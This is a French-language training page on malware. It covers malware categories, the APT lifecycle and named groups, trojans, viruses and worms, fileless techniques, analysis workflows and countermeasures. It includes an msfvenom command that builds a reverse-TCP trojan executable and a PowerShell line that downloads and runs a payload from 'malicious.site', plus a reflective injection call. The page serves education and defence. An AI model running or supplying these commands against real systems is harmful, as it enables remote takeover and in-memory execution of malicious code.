1. Concepts des malwares

Qu'est-ce qu'un malware?

Un malware (logiciel malveillant) est un programme conçu pour:

  • Endommager ou perturber des systèmes
  • Voler des données sensibles
  • Contourner les contrôles d'accès
  • Prendre le contrôle de machines
  • Envoyer des spams ou mener des attaques DDoS

Classification des malwares

Type Description
Virus Se réplique en infectant d'autres fichiers
Ver Se propage via le réseau sans hôte
Cheval de Troie Logiciel légitime contenant du code malveillant
Ransomware Chiffre les données et demande une rançon
Spyware Collecte des informations à l'insu de l'utilisateur

  • Ransomware: augmentation de 150% en 2023
  • Coût moyen d'une attaque ransomware: $4.5M
  • 95% des violations impliquent un malware

2. Concepts APT (Advanced Persistent Threat)

Caractéristiques des APT

  • Avancées: Techniques sophistiquées et ciblées
  • Persistantes: Opérations continues sur de longues périodes
  • Menaces: Acteurs motivés (États-nations, cybercriminels)

Cycle de vie d'une APT

  1. Reconnaissance
  2. Initial Intrusion
  3. Établissement de persistance
  4. Élévation de privilèges
  5. Mouvement latéral
  6. Exfiltration de données
  7. Maintien de l'accès

Groupes APT notables

APT28 Fancy Bear (Russie)
APT29 Cozy Bear (Russie)
APT34 OilRig (Iran)
APT40 Leviathan (Chine)
Lazarus Group (Corée du Nord)
Exemple: APT28 (Fancy Bear)
  • Cible: Gouvernements, militaires, organisations politiques
  • Tactiques: Spear phishing, exploits zero-day
  • Malwares: Sofacy, X-Agent

3. Concepts des chevaux de Troie

Fonctionnement des Trojans

  1. L'utilisateur exécute un fichier apparemment légitime
  2. Le code malveillant est chargé en mémoire
  3. Connexion à un serveur C2 (Command & Control)
  4. Exécution des commandes à distance

Types de Trojans

  • Backdoor: Accès administrateur à distance
  • Banker: Vol d'identifiants bancaires
  • DDoS: Lancement d'attaques par déni de service
  • Downloader: Télécharge d'autres malwares
  • RAT: Remote Access Trojan (contrôle total)

Techniques d'obfuscation

  • Packers: UPX, Themida, VMProtect
  • Chiffrement: AES, RC4, chiffrement personnalisé
  • Polymorphisme: Changement de signature à chaque exécution
  • Métamorphisme: Réécriture complète du code
  • Anti-debugging: Détection des environnements d'analyse

Exemples de Trojans célèbres

Zeus Spyware bancaire, créé en 2007
Emotet Trojan modulaire, distribué via spam
Gh0st RAT RAT utilisé par des groupes APT
DarkComet RAT avec fonctionnalités de surveillance
Création d'un Trojan simple
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > trojan.exe

Ce payload créé un exécutable qui établit une connexion reverse TCP vers l'attaquant.

4. Virus et vers informatiques

Virus informatiques

Caractéristiques principales:

  • Nécessite un programme hôte pour s'exécuter
  • Se réplique en infectant d'autres fichiers
  • Charge utile souvent destructive
  • Méthodes d'infection: macros, secteur de boot, fichiers exécutables

Types de virus

Type Description
Virus de fichier Infecte les fichiers exécutables (.exe, .dll)
Virus de macro Infecte les documents Word, Excel
Virus de boot Infecte le secteur de démarrage
Virus polymorphe Change son code à chaque infection

Vers informatiques

Caractéristiques principales:

  • Autonome, ne nécessite pas d'hôte
  • Se propage via le réseau sans intervention
  • Exploite des vulnérabilités logicielles
  • Peut se propager très rapidement

Vers célèbres

Morris (1988) Premier ver internet, infecta 10% des machines connectées
ILOVEYOU (2000) Ver par email, dégâts estimés à $15 milliards
WannaCry (2017) Ver ransomware exploitant EternalBlue

Différences clés

Caractéristique Virus Ver
Hôte requis Oui Non
Propagation Fichiers Réseau
Vitesse de propagation Lente Rapide
Détection Relativement facile Difficile

5. Malwares sans fichier (Fileless Malware)

Caractéristiques

  • Aucun fichier écrit sur le disque
  • Exécution en mémoire uniquement
  • Utilisation d'outils légitimes (Living-off-the-land)
  • Très difficile à détecter
  • Persistance via registre, WMI, tâches planifiées

Techniques d'attaque

Technique Description
PowerShell Attack Utilisation de scripts PowerShell malveillants
WMI Persistence Utilisation de WMI pour persister
Registry Resident Stockage du payload dans le registre
Memory Injection Injection dans des processus légitimes

Exemple: Attaque PowerShell

# Téléchargement et exécution en mémoire
IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')

# Injection dans un processus légitime
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234

Malwares sans fichier notables

  • PowerGhost: Mineur de cryptomonnaie
  • Kovter: Clicker frauduleux
  • Duqu 2.0: Malware APT
  • FIN7: Groupe utilisant des malwares sans fichier

6. Analyse des malwares

Analyse statique

Examen du malware sans l'exécuter

  • Analyse de chaînes: Strings, FLOSS
  • Désassemblage: IDA Pro, Ghidra
  • Analyse de headers: PE Explorer
  • Hashes: MD5, SHA1, SHA256
  • Détection de packers: PEiD, Exeinfo PE
Workflow d'analyse statique
  1. Calculer les hashes
  2. Identifier le type de fichier
  3. Extraire les chaînes lisibles
  4. Analyser les imports API
  5. Désassembler le code

Analyse dynamique

Exécution contrôlée du malware

  • Sandbox: Cuckoo, Any.Run
  • Debugging: x64dbg, WinDbg
  • Monitoring: Process Monitor, Wireshark
  • Analyse mémoire: Volatility
Workflow d'analyse dynamique
  1. Configurer l'environnement isolé
  2. Capturer un instantané système
  3. Exécuter le malware
  4. Surveiller les changements système
  5. Analyser le trafic réseau
  6. Dumper et analyser la mémoire

Environnements d'analyse

Réel

+ Comportement réel
- Risque d'infection

Virtualisé

+ Isolation facile
- Détection possible

Émulation

+ Sécurité maximale
- Limitation des fonctionnalités

7. Contre-mesures

Stratégies de protection

  • Défense en profondeur: Multiples couches de sécurité
  • Principle of Least Privilege: Accès minimum requis
  • Whitelisting: Autorisation explicite des applications
  • Mises à jour: Correction rapide des vulnérabilités
  • Formation utilisateurs: Reconnaissance des menaces

Protection contre les ransomwares

  • Sauvegardes régulières (règle 3-2-1)
  • Restaurations régulières de test
  • Segmentation réseau
  • Désactivation des macros
  • Limitation des droits administrateur

Détection avancée

  • EDR: Endpoint Detection and Response
  • SIEM: Corrélation des logs et alertes
  • Sandboxing: Analyse des fichiers suspects
  • Analyse comportementale: Détection des anomalies
  • Threat Intelligence: Utilisation des IoC

Réponse aux incidents

  1. Isoler les systèmes infectés
  2. Identifier le vecteur d'infection
  3. Collecter les preuves
  4. Éradiquer la menace
  5. Restaurer les systèmes
  6. Analyser les causes profondes
